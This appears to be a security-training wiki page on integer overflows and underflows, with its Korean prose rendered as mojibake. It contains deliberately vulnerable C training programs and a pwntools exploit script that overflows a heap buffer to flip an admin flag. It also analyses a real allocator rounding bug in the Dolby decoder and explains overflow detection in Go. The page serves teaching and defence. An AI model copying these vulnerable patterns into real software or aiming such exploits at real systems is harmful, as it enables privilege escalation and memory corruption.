# ì •ìˆ˜ ì˜¤ë²„í”Œë¡œìš°

{{#include ../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

í•µì‹¬ì ìœ¼ë¡œ **integer overflow**ëŠ” ì»´í“¨í„° í”„ë¡œê·¸ë˜ë°ì—ì„œ ë°ì´í„° íƒ€ì…ì˜ **í¬ê¸°**ì™€ ë°ì´í„°ì˜ **í•´ì„**ì´ ë¶€ê³¼í•˜ëŠ” ì œí•œì— ìˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, **8ë¹„íŠ¸ ë¶€í˜¸ ì—†ëŠ” ì •ìˆ˜**ëŠ” **0ì—ì„œ 255ê¹Œì§€**ì˜ ê°’ì„ í‘œí˜„í•  ìˆ˜ ìˆë‹¤. ë§Œì•½ 8ë¹„íŠ¸ ë¶€í˜¸ ì—†ëŠ” ì •ìˆ˜ì— 256ì„ ì €ì¥í•˜ë ¤ í•˜ë©´, ì €ì¥ ìš©ëŸ‰ì˜ í•œê³„ ë•Œë¬¸ì— ê°’ì´ 0ìœ¼ë¡œ ìˆœí™˜í•œë‹¤. ë§ˆì°¬ê°€ì§€ë¡œ **16ë¹„íŠ¸ ë¶€í˜¸ ì—†ëŠ” ì •ìˆ˜**ëŠ” **0ì—ì„œ 65,535ê¹Œì§€**ì˜ ê°’ì„ ê°€ì§ˆ ìˆ˜ ìˆìœ¼ë¯€ë¡œ 65,535ì— 1ì„ ë”í•˜ë©´ ê°’ì´ 0ìœ¼ë¡œ ëŒì•„ê°„ë‹¤.

ë˜í•œ, **8ë¹„íŠ¸ ë¶€í˜¸ ìˆëŠ” ì •ìˆ˜**ëŠ” **-128ì—ì„œ 127ê¹Œì§€**ì˜ ê°’ì„ í‘œí˜„í•  ìˆ˜ ìˆë‹¤. ì´ëŠ” í•œ ë¹„íŠ¸ê°€ ë¶€í˜¸(ì–‘ìˆ˜ ë˜ëŠ” ìŒìˆ˜)ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ë° ì‚¬ìš©ë˜ê³  ë‚˜ë¨¸ì§€ 7ë¹„íŠ¸ê°€ í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚´ê¸° ë•Œë¬¸ì´ë‹¤. ê°€ì¥ ì‘ì€ ê°’ì€ **-128**(ì´ì§„ `10000000`)ìœ¼ë¡œ ë‚˜íƒ€ë‚´ê³ , ê°€ì¥ í° ê°’ì€ **127**(ì´ì§„ `01111111`)ì´ë‹¤.

ì¼ë°˜ì ì¸ ì •ìˆ˜ íƒ€ì…ì˜ ìµœì†Œ/ìµœëŒ€ ê°’:
| Type           | í¬ê¸° (ë¹„íŠ¸) | ìµœì†Œê°’             | ìµœëŒ€ê°’             |
|----------------|-------------|--------------------|--------------------|
| int8_t         | 8           | -128               | 127                |
| uint8_t        | 8           | 0                  | 255                |
| int16_t        | 16          | -32,768            | 32,767             |
| uint16_t       | 16          | 0                  | 65,535            |
| int32_t        | 32          | -2,147,483,648 | 2,147,483,647      |
| uint32_t       | 32          | 0                  | 4,294,967,295      |
| int64_t        | 64          | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t       | 64          | 0                  | 18,446,744,073,709,551,615 |

64ë¹„íŠ¸ ì‹œìŠ¤í…œì—ì„œ shortëŠ” `int16_t`ì™€ ê°™ê³ , intëŠ” `int32_t`ì™€ ê°™ìœ¼ë©°, longì€ `int64_t`ì™€ ê°™ë‹¤.

### ìµœëŒ€ê°’

ì ì¬ì ì¸ **ì›¹ ì·¨ì•½ì **ì„ ê³ ë ¤í•  ë•Œ ì§€ì›ë˜ëŠ” ìµœëŒ€ê°’ì„ ì•„ëŠ” ê²ƒì€ ë§¤ìš° í¥ë¯¸ë¡­ë‹¤:

{{#tabs}}
{{#tab name="Rust"}}
```rust
fn main() {

let mut quantity = 2147483647;

let (mul_result, _) = i32::overflowing_mul(32767, quantity);
let (add_result, _) = i32::overflowing_add(1, quantity);

println!("{}", mul_result);
println!("{}", add_result);
}
```
{{#endtab}}

{{#tab name="C"}}
```c
#include <stdio.h>
#include <limits.h>

int main() {
int a = INT_MAX;
int b = 0;
int c = 0;

b = a * 100;
c = a + 1;

printf("%d\n", INT_MAX);
printf("%d\n", b);
printf("%d\n", c);
return 0;
}
```
{{#endtab}}
{{#endtabs}}

## ì˜ˆì œ

### Pure overflow

ì¶œë ¥ ê²°ê³¼ëŠ” 0ì…ë‹ˆë‹¤. charë¥¼ overflowí–ˆê¸° ë•Œë¬¸ì—:
```c
#include <stdio.h>

int main() {
unsigned char max = 255; // 8-bit unsigned integer
unsigned char result = max + 1;
printf("Result: %d\n", result); // Expected to overflow
return 0;
}
```
### Signed to Unsigned Conversion

ì‚¬ìš©ì ì…ë ¥ì—ì„œ ì½ì€ signed integerê°€ ì ì ˆí•œ ê²€ì¦ ì—†ì´ unsigned integerë¡œ ì·¨ê¸‰ë˜ëŠ” ë¬¸ë§¥ì—ì„œ ì‚¬ìš©ë˜ëŠ” ìƒí™©ì„ ìƒê°í•´ë³´ì:
```c
#include <stdio.h>

int main() {
int userInput; // Signed integer
printf("Enter a number: ");
scanf("%d", &userInput);

// Treating the signed input as unsigned without validation
unsigned int processedInput = (unsigned int)userInput;

// A condition that might not work as intended if userInput is negative
if (processedInput > 1000) {
printf("Processed Input is large: %u\n", processedInput);
} else {
printf("Processed Input is within range: %u\n", processedInput);
}

return 0;
}
```
ì´ ì˜ˆì œì—ì„œ ì‚¬ìš©ìê°€ ìŒìˆ˜ë¥¼ ì…ë ¥í•˜ë©´, binary valuesê°€ í•´ì„ë˜ëŠ” ë°©ì‹ ë•Œë¬¸ì— í•´ë‹¹ ê°’ì€ í° unsigned integerë¡œ í•´ì„ë˜ì–´ ì˜ˆìƒì¹˜ ëª»í•œ ë™ì‘ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### macOS Overflow Example
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Realistic integer-overflow â†’ undersized allocation â†’ heap overflow â†’ flag
* Works on macOS arm64 (no ret2win required; avoids PAC/CFI).
*/

__attribute__((noinline))
void win(void) {
puts("ğŸ‰ EXPLOITATION SUCCESSFUL ğŸ‰");
puts("FLAG{integer_overflow_to_heap_overflow_on_macos_arm64}");
exit(0);
}

struct session {
int is_admin;           // Target to flip from 0 â†’ 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks to avoid EINVAL on large nbyte (macOS PTY/TTY)
const size_t MAX_CHUNK = 1 << 20; // 1 MiB per read (any sane cap is fine)
size_t got = 0;

printf("Requested bytes: %zu\n", want);

while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;

ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) {
got += (size_t)n;
continue;
}
if (n == 0) {
// EOF â€“ stop; partial reads are fine for our exploit
break;
}
// n < 0: real error (likely EINVAL when chunk too big on some FDs)
perror("read");
break;
}
return got;
}


int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Bundle Importer (training) ===");

// 1) Read attacker-controlled parameters (use large values)
size_t count = 0, elem_size = 0;
printf("Entry count: ");
if (scanf("%zu", &count) != 1) return 1;
printf("Entry size: ");
if (scanf("%zu", &elem_size) != 1) return 1;

// 2) Compute total bytes with a 32-bit truncation bug (vulnerability)
//    NOTE: 'product32' is 32-bit â†’ wraps; then we add a tiny header.
uint32_t product32 = (uint32_t)(count * elem_size);//<-- Integer overflow because the product is converted to 32-bit.
/* So if you send "4294967296" (0x1_00000000 as count) and 1 as element --> 0x1_00000000 * 1 = 0 in 32bits
Then, product32 = 0
*/
uint32_t alloc32   = product32 + 32; // alloc32 = 0 + 32 = 32
printf("[dbg] 32-bit alloc = %u bytes (wrapped)\n", alloc32);

// 3) Allocate a single arena and lay out [buffer][slack][session]
//    This makes adjacency deterministic (no reliance on system malloc order).
const size_t SLACK = 512;
size_t arena_sz = (size_t)alloc32 + SLACK; // 32 + 512 = 544 (0x220)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;  // In this buffer the attacker will copy data
struct session *sess = (struct session*)(arena + (size_t)alloc32 + 16); // The session is stored right after the buffer + alloc32 (32) + 16 = buffer + 48
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p alloc32=%u sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, alloc32, (void*)sess,
((size_t)alloc32 + 16)); // This just prints the address of the pointers to see that the distance between "buf" and "sess" is 48 (32 + 16).

// 4) Copy uses native size_t product (no truncation) â†’ It generates an overflow
size_t to_copy = count * elem_size;                   // <-- Large size_t
printf("[dbg] requested copy (size_t) = %zu\n", to_copy);

puts(">> Send bundle payload on stdin (EOF to finish)...");
size_t got = read_stdin(buf, to_copy); // <-- Heap overflow vulnerability that can bue abused to overwrite sess->is_admin to 1
printf("[dbg] actually read = %zu bytes\n", got);

// 5) Privileged action gated by a field next to the overflow target
if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
ë‹¤ìŒê³¼ ê°™ì´ ì»´íŒŒì¼í•˜ì„¸ìš”:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_ovf_heap_priv int_ovf_heap_priv.c
```
#### Exploit
```python
# exploit.py
from pwn import *

# Keep logs readable; switch to "debug" if you want full I/O traces
context.log_level = "info"

EXE = "./int_ovf_heap_priv"

def main():
# IMPORTANT: use plain pipes, not PTY
io = process([EXE])  # stdin=PIPE, stdout=PIPE by default

# 1) Drive the prompts
io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32 -> (uint32_t)0
io.sendlineafter(b"Entry size: ",  b"1")           # alloc32 = 32, offset_to_sess = 48

# 2) Wait until itâ€™s actually reading the payload
io.recvuntil(b">> Send bundle payload on stdin (EOF to finish)...")

# 3) Overflow 48 bytes, then flip is_admin to 1 (little-endian)
payload = b"A" * 48 + p32(1)

# 4) Send payload, THEN send EOF via half-close on the pipe
io.send(payload)
io.shutdown("send")   # <-- this delivers EOF when using pipes, it's needed to stop the read loop from the binary

# 5) Read the rest (should print admin + FLAG)
print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
main()
```
### macOS Underflow ì˜ˆì œ
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Integer underflow -> undersized allocation + oversized copy -> heap overwrite
* Works on macOS arm64. Data-oriented exploit: flip sess->is_admin.
*/

__attribute__((noinline))
void win(void) {
puts("ğŸ‰ EXPLOITATION SUCCESSFUL ğŸ‰");
puts("FLAG{integer_underflow_heap_overwrite_on_macos_arm64}");
exit(0);
}

struct session {
int  is_admin;      // flip 0 -> 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks so huge 'want' doesn't break on PTY/TTY.
const size_t MAX_CHUNK = 1 << 20; // 1 MiB
size_t got = 0;
printf("[dbg] Requested bytes: %zu\n", want);
while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;
ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) { got += (size_t)n; continue; }
if (n == 0) break;    // EOF: partial read is fine
perror("read"); break;
}
return got;
}

int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Packet Importer (UNDERFLOW training) ===");

size_t total_len = 0;
printf("Total packet length: ");
if (scanf("%zu", &total_len) != 1) return 1; // Suppose it's "8"

const size_t HEADER = 16;

// **BUG**: size_t underflow if total_len < HEADER
size_t payload_len = total_len - HEADER;   // <-- UNDERFLOW HERE if total_len < HEADER --> Huge number as it's unsigned
// If total_len = 8, payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 = 18446744073709551608 (on 64bits - huge number)
printf("[dbg] total_len=%zu, HEADER=%zu, payload_len=%zu\n",
total_len, HEADER, payload_len);

// Build a deterministic arena: [buf of total_len][16 gap][session][slack]
const size_t SLACK = 256;
size_t arena_sz = total_len + 16 + sizeof(struct session) + SLACK; // 8 + 16 + 72 + 256 = 352 (0x160)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;
struct session *sess = (struct session*)(arena + total_len + 16);
// The offset between buf and sess is total_len + 16 = 8 + 16 = 24 (0x18)
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p total_len=%zu sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, total_len, (void*)sess, total_len + 16);

puts(">> Send payload bytes (EOF to finish)...");
size_t got = read_stdin(buf, payload_len);
// The offset between buf and sess is 24 and the payload_len is huge so we can overwrite sess->is_admin to set it as 1
printf("[dbg] actually read = %zu bytes\n", got);

if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
ë‹¤ìŒê³¼ ê°™ì´ ì»´íŒŒì¼í•˜ì„¸ìš”:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_underflow_heap int_underflow_heap.c
```
### Allocator alignment rounding wrap â†’ undersized chunk â†’ heap overflow (Dolby UDC case)

ì¼ë¶€ custom allocatorsëŠ” overflow ì—¬ë¶€ë¥¼ ì¬ê²€ì‚¬í•˜ì§€ ì•Šê³  allocationsì„ alignmentê¹Œì§€ ë°˜ì˜¬ë¦¼í•©ë‹ˆë‹¤. Dolby Unified Decoder (Pixel 9, CVE-2025-54957)ì—ì„œëŠ” ê³µê²©ìê°€ ì œì–´í•˜ëŠ” `emdf_payload_size`ê°€ (unbounded `variable_bits(8)` loopìœ¼ë¡œ ë””ì½”ë”©ë˜ì–´) `ddp_udc_int_evo_malloc`ì— ì „ë‹¬ë©ë‹ˆë‹¤:
```c
size_t total_size = alloc_size + extra;
if (alloc_size + extra < alloc_size) return 0; // initial wrap guard
if (total_size % 8)
total_size += (8 - total_size) % total_size; // vulnerable rounding
if (total_size > heap->remaining) return 0;
```
64-bit ê°’ì´ `0xFFFFFFFFFFFFFFF9` ê·¼ì²˜ì¼ ê²½ìš°, `(8 - total_size) % total_size`ê°€ ë§ì…ˆì„ ë˜í•‘í•˜ì—¬ ë…¼ë¦¬ì  `alloc_size`ëŠ” ì—¬ì „íˆ ê±°ëŒ€í•¨ì—ë„ ë¶ˆêµ¬í•˜ê³  **ì‘ì€ `total_size`**ë¥¼ ë§Œë“¤ì–´ëƒ…ë‹ˆë‹¤. í˜¸ì¶œìëŠ” ì´í›„ ë°˜í™˜ëœ ì²­í¬ì— `payload_length` ë°”ì´íŠ¸ë¥¼ ì”ë‹ˆë‹¤:
```c
buffer = ddp_udc_int_evo_malloc(evo_heap, payload_length, extra);
for (size_t i = 0; i < payload_length; i++) { // bounds use logical size
buffer[i] = next_byte_from_emdf();       // writes past tiny chunk
}
```
Why exploitation is reliable in this pattern:
- **Overflow length control:** ë°”ì´íŠ¸ëŠ” ë‹¤ë¥¸ ê³µê²©ìê°€ ì„ íƒí•œ ê¸¸ì´(`emdf_container_length`)ë¡œ ì œí•œëœ readerì—ì„œ ê³µê¸‰ë˜ë¯€ë¡œ, ì“°ê¸°ëŠ” `payload_length`ë¥¼ ì „ë¶€ ë¿Œë¦¬ëŠ” ëŒ€ì‹  N ë°”ì´íŠ¸ í›„ì— ë©ˆì¶˜ë‹¤.
- **Overflow data control:** ì²­í¬ë¥¼ ë„˜ì–´ ì“°ì—¬ì§€ëŠ” ë°”ì´íŠ¸ëŠ” ì „ë¶€ EMDF payloadì—ì„œ ê³µê²©ìê°€ ì œê³µí•œë‹¤.
- **Heap determinism:** allocatorëŠ” í”„ë ˆì„ë³„ bump-pointer slabì´ë©° freesê°€ ì—†ìœ¼ë¯€ë¡œ, ì†ìƒëœ ê°ì²´ë“¤ì˜ ì¸ì ‘ì„±ì€ ì˜ˆì¸¡ ê°€ëŠ¥í•˜ë‹¤.

## ê¸°íƒ€ ì˜ˆì œ

- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- ë¹„ë°€ë²ˆí˜¸ í¬ê¸°ë¥¼ ì €ì¥í•˜ëŠ” ë° 1Bë§Œ ì‚¬ìš©ë˜ë¯€ë¡œ overflowë¥¼ ì¼ìœ¼ì¼œ ê¸¸ì´ë¥¼ 4ë¡œ ì¸ì‹í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆê³ , ì‹¤ì œë¡œëŠ” 260ìœ¼ë¡œ ê¸¸ì´ ê²€ì‚¬ ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤
- [https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html)

- ëª‡ ê°œì˜ ìˆ«ìê°€ ì£¼ì–´ì¡Œì„ ë•Œ z3ë¥¼ ì‚¬ìš©í•´ ì²« ë²ˆì§¸ ìˆ˜ì™€ ê³±í–ˆì„ ë•Œ ë‘ ë²ˆì§¸ ìˆ˜ê°€ ë˜ëŠ” ìƒˆë¡œìš´ ìˆ˜ë¥¼ ì°¾ì•„ë¼:

```
(((argv[1] * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

- [https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)
- ë¹„ë°€ë²ˆí˜¸ í¬ê¸°ë¥¼ ì €ì¥í•˜ëŠ” ë° 1Bë§Œ ì‚¬ìš©ë˜ë¯€ë¡œ overflowë¥¼ ì¼ìœ¼ì¼œ ê¸¸ì´ë¥¼ 4ë¡œ ì¸ì‹í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆê³ , ì‹¤ì œë¡œëŠ” 260ì´ë¼ì„œ ê¸¸ì´ ê²€ì‚¬ ë³´í˜¸ë¥¼ ìš°íšŒí•˜ê³  ìŠ¤íƒì˜ ë‹¤ìŒ ë¡œì»¬ ë³€ìˆ˜ë¥¼ ë®ì–´ì¨ ë‘ ë³´í˜¸ë¥¼ ëª¨ë‘ ìš°íšŒí•  ìˆ˜ ìˆë‹¤

## Goì˜ integer overflow ê°ì§€ (go-panikint ì‚¬ìš©)

GoëŠ” ì •ìˆ˜ ì—°ì‚°ì„ ì¡°ìš©íˆ ë˜í•‘í•œë‹¤. [go-panikint](https://github.com/trailofbits/go-panikint)ëŠ” SSA overflow checksë¥¼ ì£¼ì…í•˜ëŠ” í¬í¬ëœ Go toolchainìœ¼ë¡œ, ë˜í•‘ëœ ì‚°ìˆ  ì—°ì‚°ì´ ì¦‰ì‹œ `runtime.panicoverflow()`(panic + stack trace)ë¥¼ í˜¸ì¶œí•˜ê²Œ ë§Œë“ ë‹¤.

**ì‚¬ìš© ì´ìœ **

- ì‚°ìˆ  ì—°ì‚°ì´ ë˜í•‘ë  ë•Œ ì¦‰ì‹œ crashí•˜ë¯€ë¡œ overflow/truncationì´ fuzzing/CIì—ì„œ ë°œê²¬ ê°€ëŠ¥í•´ì§„ë‹¤.
- user-controlled pagination, offsets, quotas, í¬ê¸° ê³„ì‚°, ë˜ëŠ” ì ‘ê·¼ ì œì–´ ìˆ˜í•™(ì˜ˆ: `end := offset + limit`ì—ì„œ ì‘ì€ ê°’ìœ¼ë¡œ ë˜í•‘ë˜ëŠ” `uint64`) ì£¼ë³€ì—ì„œ ìœ ìš©í•˜ë‹¤.

**ë¹Œë“œ ë° ì‚¬ìš©ë²•**
```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```
í…ŒìŠ¤íŠ¸/fuzzingìš©ìœ¼ë¡œ ì´ í¬í¬ëœ `go` ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ì—¬ ì˜¤ë²„í”Œë¡œìš°ë¥¼ panicsë¡œ ë“œëŸ¬ë‚´ì„¸ìš”.

**ë…¸ì´ì¦ˆ ì œì–´**

- ì˜ë¦¼(truncation) ê²€ì‚¬(ë” ì‘ì€ ì •ìˆ˜ë¡œì˜ ìºìŠ¤íŠ¸)ëŠ” ë…¸ì´ì¦ˆê°€ ë§ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì˜ë„ì ì¸ wrap-aroundëŠ” ì†ŒìŠ¤ ê²½ë¡œ í•„í„° ë˜ëŠ” ì¸ë¼ì¸ `// overflow_false_positive` / `// truncation_false_positive` ì£¼ì„ìœ¼ë¡œ ì–µì œí•˜ì„¸ìš”.

**ì‹¤ì œ ì‚¬ë¡€ íŒ¨í„´**

go-panikintëŠ” Cosmos SDKì˜ `uint64` í˜ì´ì§• ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°í˜€ëƒˆìŠµë‹ˆë‹¤: `end := pageRequest.Offset + pageRequest.Limit`ì´ `MaxUint64`ë¥¼ ë„˜ì–´ ë˜í•‘ë˜ì–´ ë¹ˆ ê²°ê³¼ë¥¼ ë°˜í™˜í–ˆìŠµë‹ˆë‹¤. ê³„ì¸¡(instrumentation)ì€ ì´ ì¡°ìš©í•œ ë˜í•‘ì„ panicìœ¼ë¡œ ë°”ê¿” fuzzersê°€ ìµœì†Œí™”í•  ìˆ˜ ìˆê²Œ í–ˆìŠµë‹ˆë‹¤.

## ARM64

ì´ê²ƒì€ ARM64ì—ì„œ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤ â€” ìì„¸í•œ ë‚´ìš©ì€ [**this blog post**](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## References

- [Detect Goâ€™s silent arithmetic bugs with go-panikint](https://blog.trailofbits.com/2025/12/31/detect-gos-silent-arithmetic-bugs-with-go-panikint/)
- [go-panikint (compiler fork)](https://github.com/trailofbits/go-panikint)
- [Pixel 0-click â€“ CVE-2025-54957 allocator wrap â†’ heap overflow](https://projectzero.google/2026/01/pixel-0-click-part-1.html)

{{#include ../banners/hacktricks-training.md}}
